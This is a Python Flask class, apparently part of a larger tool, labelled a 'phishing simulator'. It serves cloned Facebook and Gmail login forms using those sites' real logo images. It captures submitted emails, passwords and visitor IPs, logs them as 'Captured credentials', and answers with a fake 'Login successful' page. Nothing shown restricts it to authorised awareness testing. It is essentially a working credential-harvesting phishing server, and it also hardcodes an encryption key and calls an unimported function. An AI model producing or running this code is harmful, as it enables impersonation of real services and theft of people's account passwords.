from flask import Flask, request, render_template_string
from ..utils.encryption import AESEncryptor
from ..utils.logger import Logger
import ssl

class PhishingSimulator:
    def __init__(self):
        self.app = Flask(__name__)
        self.templates = {
            'facebook': """
                <form method="POST">
                    <div class="fb-login">
                        <img src="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmGYK7i25O.svg" width="100">
                        <input type="email" name="email" placeholder="Email" required>
                        <input type="password" name="pass" placeholder="Password" required>
                        <button type="submit">Login</button>
                    </div>
                </form>
            """,
            'gmail': """
                <form method="POST">
                    <div class="gmail-login">
                        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" width="50">
                        <input type="email" name="email" placeholder="Email" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Next</button>
                    </div>
                </form>
            """
        }
        self.encryptor = AESEncryptor("j4v5d1k9f8s7d6a5")
        self.logger = Logger(__name__)

    def run(self, template, port):
        print(colored(f"[*] Starting phishing server on port {port} with template: {template}", "cyan"))
        @self.app.route('/<template>', methods=['GET', 'POST'])
        def phishing(template):
            if template not in self.templates:
                return "Invalid template", 404

            if request.method == 'POST':
                credentials = {
                    'template': template,
                    'ip': request.remote_addr,
                    'data': {
                        'email': request.form.get('email'),
                        'password': self.encryptor.encrypt(request.form.get('password', ''))
                    }
                }
                self.logger.critical(f"Captured credentials: {credentials}")
                return "<h3>Login successful</h3>"

            return render_template_string(self.templates[template])

        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.load_cert_chain('cert.pem', 'key.pem')
        self.app.run(host='0.0.0.0', port=port, ssl_context=context)
